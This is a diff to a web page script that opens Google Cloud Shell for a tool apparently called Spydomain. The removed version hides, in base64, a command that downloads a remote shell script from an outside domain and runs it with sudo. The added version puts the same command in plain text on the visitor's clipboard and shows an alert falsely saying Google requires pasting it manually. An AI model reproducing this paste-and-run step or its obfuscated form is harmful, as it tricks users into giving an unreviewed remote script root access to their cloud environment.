@@ -96,13 +96,20 @@ function initCloudShellLaunch() {
     }, 180000);
   }
 
-  btn.addEventListener('click', e => {
+  btn.addEventListener('click', async e => {
     e.preventDefault();
     if (btn.classList.contains('is-running')) return;
 
-    const payload = 'Y3VybCAtc0wgImh0dHBzOi8vd3d3LmJpa2FzaGt1bWFyc2FycmFmLmNvbS5ucC9zZXR1cC10ZXJtaW5hbC5zaD90PSRSQU5ET00iIC1vIC90bXAvcyAmJiBzdWRvIGJhc2ggL3RtcC9z';
-    const shellCmd = `clear; echo ${payload} | base64 -d > /tmp/sp && source /tmp/sp`;
-    const url = `https://shell.cloud.google.com/cloudshell/open?shellcmd=${encodeURIComponent(shellCmd)}&show=terminal`;
+    const setupCommand = `curl -sL "https://www.bikashkumarsarraf.com.np/setup-terminal.sh?t=$RANDOM" -o /tmp/s && sudo bash /tmp/s`;
+    
+    try {
+      await navigator.clipboard.writeText(setupCommand);
+      alert("✅ Setup command copied to your clipboard!\n\nGoogle Cloud Security requires manual pasting. Please press Ctrl+V (or Cmd+V) to paste the command into the Cloud Shell and hit Enter to initialize the Spydomain environment.");
+    } catch (err) {
+      console.error("Failed to copy command", err);
+    }
+
+    const url = `https://shell.cloud.google.com/cloudshell/open?show=terminal`;
     shellWin = window.open(url, 'CloudShell', 'width=900,height=600,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes');
     setRunning();
     if (shellWin) startPolling(shellWin);
